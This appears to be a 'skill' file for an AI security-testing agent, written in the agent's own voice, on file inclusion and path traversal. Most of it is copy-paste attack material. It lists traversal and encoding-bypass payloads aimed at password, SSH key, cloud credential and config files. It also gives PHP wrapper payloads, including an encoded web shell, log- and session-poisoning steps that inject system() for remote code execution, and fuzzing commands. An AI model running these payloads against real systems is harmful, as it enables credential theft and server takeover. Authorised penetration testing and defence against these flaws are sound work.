# SKILL: Local / Remote File Inclusion / Path Traversal

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (local / remote file inclusion / path traversal) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Anywhere the app reads/serves files based on user input — query params, multipart filenames, JSON paths, archive uploads. I escalate LFI to RCE via log poisoning, session files, /proc tricks, PHP wrappers.

---

## DETECTION
Inject `../../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`, `....//....//....//etc/passwd`, etc. Observe file content in response.

## EXPLOITATION
### Linux paths
```
../../../../../../etc/passwd
../../../../../../etc/passwd%00
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%afetc%c0%afpasswd
/etc/passwd
file:///etc/passwd
/proc/self/environ
/proc/self/cmdline
/proc/self/maps
/proc/self/fd/0..255
/proc/<pid>/cmdline
/var/log/apache2/access.log         (log poisoning)
/var/log/nginx/access.log
/var/lib/php/sessions/sess_<id>      (session poisoning)
~/.ssh/id_rsa
~/.bash_history
~/.aws/credentials
/var/www/html/wp-config.php
```

### Windows paths
```
..\..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
C:\windows\win.ini
C:\Users\<user>\.aws\credentials
C:\inetpub\wwwroot\web.config
```

### PHP wrappers (when LFI is in `include()`/`require()`)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://input        (POST body becomes file content — RCE if include)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id        (with expect ext — rare)
zip://upload.zip%23evil.php
phar://upload.phar/evil
```

### Log poisoning to RCE
1. Inject `<?php system($_GET['c']); ?>` into log via User-Agent / Referer.
2. Include the log file: `?file=/var/log/apache2/access.log&c=id`

### Sessions poisoning to RCE (PHP)
1. Set session var with PHP code.
2. Include the session file `/var/lib/php/sessions/sess_<id>`.

### `/proc/self/environ` to RCE
1. Inject PHP into User-Agent.
2. Include `/proc/self/environ?c=id`.

## PAYLOADS (real, copy-paste, grouped)
(See above)

## BYPASS TECHNIQUES
- Strip `../` once → use `....//`.
- Strip `../` recursively → `..%2f`, `%2e%2e%2f`.
- Append `.png` → null byte `%00` (PHP < 5.4) or path truncation (very long string: 4096 char `././././...`).
- Encoding: double-URL, double-decode, UTF-8 overlong (`%c0%2e%c0%2e/`).
- Whitelist of basenames → use absolute paths.
- Strip `/etc/passwd` literal → `/etc/./passwd`, `/etc//passwd`, `///etc/passwd`.

## CHAIN POTENTIAL
LFI → RCE via wrapper / log / session / `/proc`; LFI → SSH key exfil → lateral; LFI → DB creds → escalate.

## TOOLS
LFISuite, ffuf with LFI wordlist, Burp Intruder

## COMMANDS
```bash
# ffuf with LFI wordlist
ffuf -u 'https://target/?file=FUZZ' -w ~/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0

# LFISuite
python3 lfisuite.py
```

## EDGE CASES / NOT-A-BUG TRAPS
Modern frameworks rarely have raw `include` LFI; more common is `sendFile()`-style download endpoints with traversal. Still high-impact when found.

## TRIAGE ANGLE (per platform)
Show `/etc/passwd` content; for impact, escalate to env var leak (DB / cloud creds).

## SEVERITY & CVSS
Read-only LFI: 7.5; LFI→RCE: 9.8.

## REFERENCES
PortSwigger Path Traversal • PayloadsAllTheThings/File Inclusion • HackTricks LFI
